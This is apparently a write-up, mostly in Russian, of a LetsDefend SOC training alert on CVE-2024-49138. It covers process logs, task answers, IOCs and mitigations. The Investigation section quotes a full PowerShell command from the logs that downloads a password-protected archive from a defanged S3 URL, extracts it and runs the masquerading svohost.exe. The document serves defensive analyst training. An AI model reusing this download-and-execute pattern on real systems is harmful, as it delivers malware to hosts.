# Description

> *CVE-2024-49138 stems from a heap-based buffer overflow vulnerability in the Windows Common Log File System (CLFS) Driver and can be exploited by attackers to elevate their privileges on the target host to SYSTEM, according to Microsoft.*

> *CVE-2024-49138 связан с уязвимостью переполнения буфера на основе кучи в драйвере Windows Common Log File System (CLFS) и может быть использован злоумышленниками для повышения своих привилегий на целевом хосте до SYSTEM, согласно Microsoft.*

# Basic Information
```
EventID: 313
Event Time: Jan, 22, 2025, 02:37 AM
Rule: SOC335 - CVE-2024-49138 Exploitation Detected
Level: Security Analyst
Hostname: Victor
Ip Address: 172.16.17.207
Process Name: svohost.exe
Process Path: "C:\temp\service_installer\svohost.exe"
Process ID: 7640
Parent Process: C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe
Command Line: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
File Hash: b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9
Process User: EC2AMAZ-ILGVOIN\LetsDefend
Trigger Reason: Unusual or suspicious patterns of behavior linked to the hash have been identified, indicating potential exploitation of CVE-2024-49138.
Device Action: Allowed
```

# Investigation

Подозрительные действия начинаются с выполнения команды: 
"C:\Windows\system32\whoami.exe" /priv
Родительский процесс: C:\Windows\explorer.exe
Действиие выполнялось под учетной записью: EC2AMAZ-ILGVOIN\Victor
Дата и время возникновения: Jan 22 2025 14:36:26

Сам процесс explorer.exe запускается от процесса C:\Windows\System32\userinit.exe, т.е. при входе пользователя - тут ничего подозрительного нет, обычная активность.

Далее в Jan 22 2025 14:36:26 был выполнен запуск процесса C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe
Запускаемая команда: "C:\Windows\system32\whoami.exe" /priv
Родительский процесс: C:\Windows\explorer.exe
Действие выполнялось под учетной записью: EC2AMAZ-ILGVOIN\Victor

Далее в Jan 22 2025 14:36:39 был выполнен запуск процеса: "C:\Windows\system32\whoami.exe"

После этого в Jan 22 2025 14:37:10 был выполнен запуск процесса C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe
Запускаемая команда: $url = 'hXXps[://]files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/service-installer.zip'; $dest = 'C:\temp\service-installer.zip'; $extractPath = 'C:\temp'; $password = 'infected'; if (-not (Test-Path -Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath -Force | Out-Null }; Invoke-WebRequest -Uri $url -OutFile $dest; $7zipPath = 'C:\Program Files\7-Zip\7z.exe'; Start-Process -FilePath $7zipPath -ArgumentList "x -p$password -o$extractPath $dest" -NoNewWindow -Wait -PassThru; Remove-Item -Path $dest; Start-Process -FilePath "$extractPath\service_installer\svohost.exe"
Родительский процесс: C:\Windows\explorer.exe
Действие выполнялось под учетной записью: EC2AMAZ-ILGVOIN\Victor
Команда выполняет скачивание архива service-installer.zip с ресурса hXXps[://]files-ld[.]s3[.]us-east-2[.]amazonaws[.]com (как я понимаю это S3 backet Amazon, облачное хранилище).

Далее был запущен процесс "C:\temp\service_installer\svohost.exe" в Jan 22 2025 14:37:12.
Хэш процесса: b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9
Родительский процесс: C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe
Действие выполнялось под учетной записью: EC2AMAZ-ILGVOIN\Victor
Явная маскировка под легитимный процесс - svchost.exe

По сетевым логам ничего подозрительного не обнаружено -> IP-адреса не являются вредоносными, относятся к Amazon.  

Активность странная, хэш файла является вредоносным, поэтому есть обоснованные причины изолировать рабочую машину пользователя от сети + заблокировать учетную запись.

<img width="1218" height="1050" alt="image" src="https://github.com/user-attachments/assets/a9c3c986-711d-4c0a-a36c-fcec1a979782" />

### Task1. Define Threat Indicator
Тут спорный момент, но неизвестный исходящий интернет трафик был. Возможно это и неверный ответ. 

<img width="678" height="236" alt="image" src="https://github.com/user-attachments/assets/b5e9b234-70ea-462b-8457-6a736e8485e2" />

### Task2. Check if the malware is quaratined/cleaned

Согласно сетевым логам + событиям с хоста - ВПО **не было удалено/помещено в карантин**.

<img width="758" height="405" alt="image" src="https://github.com/user-attachments/assets/b63bd03b-2ceb-4ce5-a6ef-2da9ed415c85" />

### Task3. Analyze Malware
По информации из открытых источников: ВПО является вредоносным

<img width="1377" height="1110" alt="image" src="https://github.com/user-attachments/assets/f3c5f6c0-67dc-4316-87e8-b746a9292848" />

Также есть интересные строки:
<img width="1664" height="976" alt="image" src="https://github.com/user-attachments/assets/102ebf3f-e44e-43d3-85ed-0eb9c5912293" />

<img width="692" height="344" alt="image" src="https://github.com/user-attachments/assets/ab7a71fc-d4ad-467c-8abd-ae03a95f3607" />

### Task4. Check If Someone Requested the C2

<img width="684" height="342" alt="image" src="https://github.com/user-attachments/assets/d0f5e68d-50dd-4709-b1dc-d84d1784f380" />

Согласно сетевым логам как такового взаимодействия с C2 не было, но в логах есть упоминание IP-адреса 185[.]107[.]56[.]141 (Netherlands, Roosendaal, NFOrce Entertainment BV)

<img width="1357" height="567" alt="image" src="https://github.com/user-attachments/assets/240db175-6b67-4e5d-9bff-9b9a23e825d7" />

По информациии с AbuseIPDB IP-адрес используется для атак типа BruteForce, также по информации с Abuse.ch - зафиксировано распрострения ВПО с данного IP-адреса + согласно логам фиксировались неуспешные попытки входа под учетными записями: admin, guest. Под УЗ EC2AMAZ-ILGVOIN\Victor фиксируется успешный вход

<img width="1184" height="1106" alt="image" src="https://github.com/user-attachments/assets/9ff3c187-ed26-4915-95ca-995289785e4c" />

<img width="1333" height="1250" alt="image" src="https://github.com/user-attachments/assets/58bc190b-a5a6-43dc-aeeb-e1e93fcfedf4" />

# Mitigations
Уточнить у владельца хоста или администраторов инфраструктуры легитимность указанных сетевых взаимодействий и легитимность скачанного файла "C:\temp\service_installer\svohost.exe". В случае, если указанные действия не являются легитимными выполнить следующее:
1) Изолировать хост Victor (172.16.17.207) от сети и заблокировать учетную запись EC2AMAZ-ILGVOIN\Victor до выяснения причин возникновениия инцидента;
2) Заблокировать сетевое взаимодействие с IP-адресом 185[.]107[.]56[.]141 и домен files-ld[.]s3[.]us-east-2[.]amazonaws[.]com на МСЭ;
3) Проверить состояние антивирусного ПО и антивирусных баз;
4) Провести сканирование АВПО хоста Victor (172.16.17.207).

<img width="1432" height="209" alt="image" src="https://github.com/user-attachments/assets/1c057671-c9ba-44a0-8443-d22c82cf803a" />


# IOCs
```
b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9 - malware hash
185[.]107[.]56[.]141 - Potenial Malware IP
hXXps[://]files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/service-installer.zip - Potential Malware URL
C:\temp\service_installer\svohost.exe - Masquarade for legitimate process
```
